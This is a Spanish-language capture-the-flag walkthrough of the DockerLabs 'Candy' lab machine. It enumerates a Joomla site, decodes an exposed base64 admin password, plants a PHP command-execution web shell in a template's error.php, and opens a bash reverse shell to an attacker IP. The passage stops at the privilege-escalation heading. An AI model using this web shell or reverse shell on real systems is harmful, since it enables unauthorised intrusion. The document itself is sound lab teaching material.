La máquina Candy de la plataforma DockerLabs.es, es de dificultad "Fácil", y nos muestra/enseña como un gestor de contenido (CMS), llamado Joomla, puede darnos acceso a la máquina víctima logrando editar uno de sus archivos .php de configuración . .   

# CANDY

## 🚀 DESPLIEGUE DE MÁQUINA

Una vez descargado el archivo .zip de la plataforma dockerlabs.es, se descomprime con el comando unzip y se despliega de la siguiente manera:

<img width="1163" height="530" alt="candy1" src="https://github.com/user-attachments/assets/e85b87eb-38e8-477c-b03f-2545e25f0fae" />

## 🔎 ENUMERACIÓN

Una vez que ya tenemos la ip de la máquina víctima, procederemos a realizar un escaneo con la herramienta nmap, que nos muestre todos los puertos abiertos exístentes para así lograr acceso a la máquina, esto con el siguiente comando, una vez ejecutado, nos damos cuenta que solamente exíste el puerto 80 expuesto, correspondiente al servicio HTTP.

<img width="1148" height="516" alt="candy2" src="https://github.com/user-attachments/assets/0f7b80a8-0606-421f-ae93-e67e40b020f4" />

Ya sabemos que exíste el puerto 80 abierto, por lo tanto, procederemos nuevamente a realizar un escaneo más exhaustivo con nmap, esta vez, indicandole a nmap que nos enumere la versión de dicho servicio HTTP, a su vez, tambien indicandole que nos arroje un conjunto básico de scripts de reconocimiento, ya ejecutado podemos visualizar que nos encontró un directorio llamado /un_caramelo, que no es común, por lo tanto, nos genera sospecha, tambien nos muestra que exíste el archivo robots.txt expuesto, que tambien puede contener directorios sensibles, además, nos muestra que estamos frente a un gestor de contenido (CMS), llamado Joomla.

<img width="1060" height="637" alt="candy3 1" src="https://github.com/user-attachments/assets/0e3a8490-4707-4694-ab7c-ac2849f0c7e3" />

Ya en este punto, iremos a verificar la web, vemos el típico login de Joomla, como no tenemos credenciales válidas, nos dirigeremos al directorio /un_caramelo, daremos CTRL + U para exáminar el código fuente, y nos encontramos con la password del usuario admin expuesta, pero codificada en base64.

<img width="1227" height="627" alt="candy4" src="https://github.com/user-attachments/assets/dd77e8e5-720f-4fdc-a70b-f4b489c939dd" />

<img width="1227" height="627" alt="candy5" src="https://github.com/user-attachments/assets/c862367c-2d02-438d-b17c-5280c1f68157" />

<img width="1227" height="627" alt="candy6" src="https://github.com/user-attachments/assets/42e2742e-a8f0-4383-a015-cfb0bdd30e13" />


Por terminal daremos el siguiente comando, que nos permitirá decodificar la password de admin.

```bash
echo "c2FubHVpczEyMzQ1" | base64 -d;echo
```
<img width="560" height="277" alt="candy7" src="https://github.com/user-attachments/assets/a8f55653-98a2-43a5-bb38-e48918bd9de6" />

Una vez ya tenemos la password de admin, nos loguearemos en el panel de Joomla, pero esta vez en el directorio /administrator para acceder de una vez al dashboard de administrador, luego nos dirigiremos a System > Administrator Templates > Atum, para intentar modificar algun archivo del CMS y poder inyectarle código malicioso.

<img width="1210" height="619" alt="candy8" src="https://github.com/user-attachments/assets/33928044-a4dc-4e14-b158-cc96199f9abe" />

<img width="1210" height="619" alt="candy9" src="https://github.com/user-attachments/assets/dc0dc793-bc8e-48a2-a460-e86b5af54e16" />

## 💣 EXPLOTACIÓN

Encontramos un archivo llamado error.php, del cual nos aprovecharemos para invocar el parámetro "cmd" y lograr ejecutar comandos a nivel de sistema, colandole lo siguiente:

```bash
if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
```

<img width="1210" height="619" alt="candy10" src="https://github.com/user-attachments/assets/0483b2af-d85a-4988-ab99-66e5789a8bfc" />

Le damos a guardar y probamos inyectar un "id" en la url, nos devuelve el usuario por defecto de la máquina víctima, ¡en este punto logramos ejecutar comandos a nivel de sistema!

<img width="829" height="316" alt="candy11" src="https://github.com/user-attachments/assets/ac408379-28ff-40b7-a6a5-abea600f4d2a" />

Desde nuestra terminal, nos ponemos en escucha con netcat por el puerto 443 y nos lanzamos el típico oneliner de reverse shell,de la siguiente manera:

```bash
bash -c 'bash -i >%26 /dev/tcp/10.0.2.15/443 0>%261'
```

<img width="829" height="316" alt="candy12" src="https://github.com/user-attachments/assets/4963b87e-3712-4355-8ee6-f151c4b684c6" />

<img width="1019" height="316" alt="candy13" src="https://github.com/user-attachments/assets/a9a7760b-82ad-4f17-8ac5-6ab2b4bc31f7" />


## 🔑 ESCALADA DE PRIVILEGIOS
